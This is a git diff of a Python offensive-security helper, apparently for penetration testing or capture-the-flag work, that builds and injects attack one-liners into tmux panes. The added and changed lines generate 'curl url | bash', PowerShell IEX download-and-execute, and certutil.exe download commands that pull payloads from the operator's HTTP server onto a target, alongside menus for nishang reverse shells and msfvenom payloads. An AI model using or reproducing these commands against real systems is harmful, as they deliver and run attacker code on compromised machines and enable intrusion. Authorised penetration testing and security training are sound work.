@@ -89,8 +89,9 @@ def get_temp_python_file(pattern):
     files = strip_lines(os.popen(cmd).readlines())
     index = TerminalMenu(files).show()
     filename = files[index]
-    url = f"http://{ip}:{port}/{filename}"
-    return url
+    if int(port) != 80: url = f"http://{ip}:{port}/{filename}"
+    else: url = f"http://{ip}/{filename}"
+    return url, filename
 
 def select_python_http():
     cmd = "ps -ef | grep http.server | grep -v grep"
@@ -158,13 +159,13 @@ def linux_menu():
             if useApache: 
                 file = get_apache_file('')
                 url = f"{ip}/{file}"
-            else: url = get_temp_python_file('')
+            else: url, _ = get_temp_python_file('')
             cmd = f"wget {url}"
         elif index == 2: # curl file and pipe to bash
             if useApache:
                 file = get_apache_file('.sh')
                 url = f"{ip}/{file}"
-            else: url = get_temp_python_file('.sh')
+            else: url, _ = get_temp_python_file('.sh')
             cmd = f"curl {url} | bash"
         copy_to_pane(cmd)
 
@@ -289,31 +290,35 @@ def msfvenom_menu():
     main() # call the main menu after msfvenom generation
 
 def windows_menu():
-    options = ["wget outfile", "IEX download and run script", "Prepare nishang reverse shell"]
+    options = ["PS wget outfile", "PS IEX download and run script", "DOS download HTTP", "Prepare nishang reverse shell"]
     index = TerminalMenu(options).show()
     print(options[index])
-    if index == 0 or index == 1:
-        useApache = True
-        if is_python_http_running(): useApache = choose_apache_or_python()
+    if index in [0,1,2]:        
+        def getUrl(fileSelector):
+            # useApache = True
+            # if is_python_http_running(): useApache = choose_apache_or_python()
+            if not is_python_http_running() or choose_apache_or_python(): # use apache
+                file = get_apache_file(fileSelector)
+                url = f"http://{ip}/{file}"
+                return url, file
+            else:
+                return get_temp_python_file(fileSelector)
+        
         ip = get_interface_ip()
         pane = select_pane()
+
         if index == 0:
-            if useApache:
-                file = get_apache_file('')
-                url = f"{ip}/{file}"
-            else:
-                url = get_temp_python_file('')
-                file = url.split('/')[-1]
+            url, file = getUrl('')
             cmd = f"tmux send-keys -t {pane} 'wget '{url}' -outfile {file}'"
         elif index == 1:
-            if useApache:
-                file = get_apache_file('.ps1')
-                url = f"http://{ip}/{file}"
-            else:
-                url = get_temp_python_file('.ps1')
+            url, _ = getUrl('.ps1')
             cmd = f"tmux send-keys -t {pane} 'IEX(New-Object Net.WebClient).downloadString(' \\' '{url}' \\' ')'"
+        elif index == 2: # DOS download HTTP
+            url, file = getUrl('')
+            cmd = f"tmux send-keys -t {pane} 'certutil.exe -urlcache -split -f \"{url}\" {file}'"
         os.system(cmd)
-    elif index == 2:
+
+    elif index == 3:
         nishang_shell_menu()
 
 def main():
@@ -330,7 +335,8 @@ def main():
         windows_menu()
     elif index == 3:
         if is_python_http_running():
-            copy_to_pane(get_temp_python_file(''))
+            url, _ = get_temp_python_file('')
+            copy_to_pane(url)
         else:
             input("Start python http server and try again")
     elif index == 4:
